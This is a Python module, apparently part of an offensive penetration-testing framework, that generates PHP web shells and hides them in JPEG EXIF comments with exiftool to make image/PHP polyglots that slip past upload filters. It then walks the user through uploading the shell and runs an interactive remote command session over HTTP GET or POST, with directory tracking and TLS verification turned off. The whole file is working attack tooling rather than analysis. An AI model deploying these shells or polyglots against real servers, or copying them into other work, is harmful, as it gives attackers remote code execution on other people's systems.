def run(data, cred, args):
    import subprocess
    import requests
    import random
    import string
    import re
    from pathlib import Path

    from core.target import get_current_url

    # ==================================================
    # COLORS
    # ==================================================

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

    # ==================================================
    # DEFAULTS
    # ==================================================

    DEFAULT_PARAM = "cmd"
    DEFAULT_METHOD = "GET"
    DEFAULT_EXT = "php"

    DEFAULT_CARRIER = (
        Path(__file__).resolve().parent / "assets/default.jpg"
    )

    # ==================================================
    # HELPERS
    # ==================================================

    def rand_name(length=6):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def print_cmd(cmd):
        print(f"{B}  └──{W} Command: {Y}{cmd}{W}")

    def copy_clipboard(text):
        try:
            subprocess.run(
                ["xclip", "-selection", "clipboard"],
                input=text,
                text=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return True
        except:
            return False

    def clean_output(text):

        import re

        match = re.search(
            r"___CMD_OUTPUT_START___(.*?)___CMD_OUTPUT_END___",
            text,
            re.DOTALL
        )

        if match:
            return match.group(1).strip()

        return text.strip()

    # ==================================================
    # ARGUMENTS
    # ==================================================

    method = (getattr(args, "method", None) or DEFAULT_METHOD).upper()
    param = getattr(args, "param", None) or DEFAULT_PARAM
    ext = getattr(args, "ext", None) or DEFAULT_EXT

    generate = getattr(args, "generate", False)
    deploy = getattr(args, "deploy", False)

    one_shot = getattr(args, "cmd", None)

    polyglot = getattr(args, "polyglot", False)
    carrier = getattr(args, "carrier", None)

    extra = getattr(args, "extra", []) or []

    # ==================================================
    # GENERATE PAYLOAD
    # ==================================================

    def generate_payload():

        name = getattr(args, "name", None) or rand_name()

        filename = f"{name}.{ext}"

        artifact = Path.cwd() / filename

        # ==================================================
        # POLYGLOT MODE
        # ==================================================

        if polyglot:

            # ----------------------------------------------
            # CARRIER IMAGE
            # ----------------------------------------------

            if carrier:
                carrier_file = Path(carrier).expanduser().resolve()
            else:
                carrier_file = DEFAULT_CARRIER.resolve()

            if not carrier_file.exists():

                print(f"\n{R}[!] {W}{BOLD}CARRIER IMAGE NOT FOUND{W}")
                print(f"{B}  └── {B}Path:{W} {Y}{carrier_file}{W}")

                return None

            # ----------------------------------------------
            # PAYLOAD
            # ----------------------------------------------

            if method == "POST":

                payload = (
                    f'<?php '
                    f'echo "___CMD_OUTPUT_START___"; '
                    f'system($_POST["{param}"]); '
                    f'echo "___CMD_OUTPUT_END___"; '
                    f'?>'
                )

            else:

                payload = (
                    f'<?php '
                    f'echo "___CMD_OUTPUT_START___"; '
                    f'system($_GET["{param}"]); '
                    f'echo "___CMD_OUTPUT_END___"; '
                    f'?>'
                )

            # ----------------------------------------------
            # EXACT WORKING EXIFTOOL COMMAND
            # ----------------------------------------------

            cmd = [
                "exiftool",
                f"-Comment={payload}",
                str(carrier_file),
                "-o",
                str(artifact)
            ]

            print_cmd(" ".join(cmd))

            # ----------------------------------------------
            # GENERATE
            # ----------------------------------------------

            try:

                subprocess.run(
                    cmd,
                    check=True
                )

            except FileNotFoundError:

                print(f"\n{R}[!] {W}{BOLD}EXIFTOOL NOT INSTALLED{W}")
                print(f"{B}  └── {B}Install:{W} sudo apt install libimage-exiftool-perl")

                return None

            except Exception as e:

                print(f"\n{R}[!] {W}{BOLD}POLYGLOT GENERATION FAILED{W}")
                print(f"{B}  └── {B}Error:{W} {Y}{e}{W}")

                return None

            # ----------------------------------------------
            # REMOVE BACKUP
            # ----------------------------------------------

            backup_file = artifact.with_suffix(
                artifact.suffix + "_original"
            )

            if backup_file.exists():
                backup_file.unlink()

            # ----------------------------------------------
            # SUCCESS HUD
            # ----------------------------------------------

            print(f"\n{G}┌── POLYGLOT GENERATED ───────────────────────────────────┐{W}")
            print(f"{G}│{W}  {B}Carrier:{W}   {C}{carrier_file.name:<36}{W}{G}│{W}")
            print(f"{G}│{W}  {B}Output:{W}    {C}{artifact.name:<36}{W}{G}│{W}")
            print(f"{G}│{W}  {B}Metadata:{W}  {Y}Comment{W}")
            print(f"{G}└──────────────────────────────────────────────────────────┘{W}")

        # ==================================================
        # NORMAL WEBSHELL
        # ==================================================

        else:

            if method == "POST":

                payload = (
                    f"<?php system($_POST['{param}']); ?>"
                )

            else:

                payload = (
                    f"<?php system($_GET['{param}']); ?>"
                )

            artifact.write_text(payload)

        # ==================================================
        # CLIPBOARD
        # ==================================================

        copied = copy_clipboard(payload)

        # ==================================================
        # HUD
        # ==================================================

        print(f"\n{B}┌── {BOLD}MODULE: WEB SHELL GENERATOR{W}{B} ───────────────────────────┐{W}")
        print(f"{B}│{W}  {B}{'Type:':<12}{W} {C}PHP{W}")

        if polyglot:
            print(f"{B}│{W}  {B}{'Mode:':<12}{W} {Y}POLYGLOT{W}")
            print(f"{B}│{W}  {B}{'Carrier:':<12}{W} {W}{carrier_file.name}{W}")

        print(f"{B}│{W}  {B}{'Method:':<12}{W} {Y}{method}{W}")
        print(f"{B}│{W}  {B}{'Parameter:':<12}{W} {Y}{param}{W}")
        print(f"{B}│{W}  {B}{'Filename:':<12}{W} {W}{filename}{W}")
        print(f"{B}└────────────────────────────────────────────────────────────┘{W}")

        print(f"\n{G}┌── GENERATED PAYLOAD ──────────────────────────────────────┐{W}")
        print(f"{G}│{W}  {payload}")
        print(f"{G}└──────────────────────────────────────────────────────────┘{W}")

        print(f"\n{B}  ├── {B}Artifact:{W} {Y}{artifact}{W}")

        if copied:
            print(f"{B}  └── {G}Payload copied to clipboard{W}")
        else:
            print(f"{B}  └── {Y}Clipboard copy failed{W}")

        return filename

    # ==================================================
    # GENERATE ONLY
    # ==================================================

    if generate and not deploy:

        generate_payload()
        return data

    # ==================================================
    # DEPLOY MODE
    # ==================================================

    if deploy:

        filename = generate_payload()

        if not filename:
            return data

        print(f"\n{Y}[*] Upload the generated shell manually{W}")

        if extra:
            upload_url = extra[0]
        else:
            upload_url = input(f"{C}Upload URL>{W} ").strip()

        if not upload_url:
            print(f"{R}[!] No upload URL provided{W}")
            return data

        if not upload_url.endswith("/"):
            upload_url += "/"

        url = upload_url + filename

        print(f"\n{G}[+] Final Shell URL:{W}")
        print(f"  {C}{url}{W}")

        input(f"\n{Y}[*] Press ENTER once uploaded...{W}")

    else:

        # ----------------------------------------------
        # INTERACTION MODE
        # ----------------------------------------------

        url = None

        if extra:
            url = extra[0]

        if not url:
            url = get_current_url(data)

    # ==================================================
    # VALIDATE URL
    # ==================================================

    if not url:
        print(f"\n{R}[!] NO URL PROVIDED{W}")
        return data

    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"

    # ==================================================
    # HUD
    # ==================================================

    print(f"\n{B}┌── {BOLD}MODULE: WEB SHELL{W}{B} ─────────────────────────────────────┐{W}")
    print(f"{B}│{W}  {B}{'URL:':<12}{W} {C}{url}{W}")
    print(f"{B}│{W}  {B}{'Method:':<12}{W} {Y}{method}{W}")
    print(f"{B}│{W}  {B}{'Parameter:':<12}{W} {Y}{param}{W}")

    if polyglot:
        print(f"{B}│{W}  {B}{'Mode:':<12}{W} {Y}POLYGLOT{W}")

    print(f"{B}└────────────────────────────────────────────────────────────┘{W}")

    # ==================================================
    # TRACK CURRENT DIRECTORY
    # ==================================================

    current_dir = None

    try:

        if method == "POST":

            response = requests.post(
                url,
                data={param: "pwd"},
                timeout=10
            )

        else:

            response = requests.get(
                url,
                params={param: "pwd"},
                timeout=10
            )

        potential_dir = clean_output(response.text)

        potential_dir = potential_dir.splitlines()[0].strip()

        if potential_dir.startswith("/"):
            current_dir = potential_dir

    except:
        pass

    # ==================================================
    # EXECUTION
    # ==================================================

    def execute(command):

        nonlocal current_dir

        try:

            # ------------------------------------------
            # HANDLE CD
            # ------------------------------------------

            if command == "cd" or command.startswith("cd "):

                target = command[2:].strip() or "~"

                if current_dir:
                    full_command = (
                        f"cd {current_dir} && "
                        f"cd {target} && pwd"
                    )
                else:
                    full_command = f"cd {target} && pwd"

            elif current_dir and current_dir != "None":

                full_command = (
                    f"cd {current_dir} && {command}"
                )

            else:

                full_command = command

            # ------------------------------------------
            # POST
            # ------------------------------------------

            if method == "POST":

                curl_cmd = (
                    f'curl -s -k -X POST '
                    f'-d "{param}={full_command}" '
                    f'"{url}"'
                )

                print_cmd(curl_cmd)

                response = requests.post(
                    url,
                    data={param: full_command},
                    timeout=10
                )

            # ------------------------------------------
            # GET
            # ------------------------------------------

            else:

                curl_cmd = (
                    f'curl -s "{url}?{param}={full_command}"'
                )

                print_cmd(curl_cmd)

                response = requests.get(
                    url,
                    params={param: full_command},
                    timeout=10, 
                    verify=False
                )

            output = clean_output(response.text)

            # ------------------------------------------
            # UPDATE CURRENT DIR
            # ------------------------------------------

            if command == "cd" or command.startswith("cd "):

                if output.startswith("/"):

                    current_dir = output

                else:

                    print(f"{R}[!] Failed changing directory{W}")

            else:

                print(output)

        except Exception as e:
            print(f"{R}[!] Request failed: {e}{W}")

    # ==================================================
    # ONE SHOT
    # ==================================================

    if one_shot:
        execute(one_shot)
        return data

    # ==================================================
    # INTERACTIVE
    # ==================================================

    print(f"\n{G}[+] Interactive web shell session started{W}")
    print(f"{DIM}Type 'exit' or 'quit' to leave{W}\n")

    while True:

        try:

            # ------------------------------------------
            # DYNAMIC PROMPT
            # ------------------------------------------

            if current_dir and current_dir.startswith("/"):

                basename = (
                    current_dir
                    .rstrip("/")
                    .split("/")[-1]
                )

                if not basename:
                    basename = "/"

                prompt = f"{C}{basename}>{W} "

            else:

                prompt = f"{C}webshell>{W} "

            cmd = input(prompt).strip()

        except KeyboardInterrupt:
            print()
            break

        if not cmd:
            continue

        if cmd.lower() in ["exit", "quit", "q"]:
            break

        execute(cmd)

    return data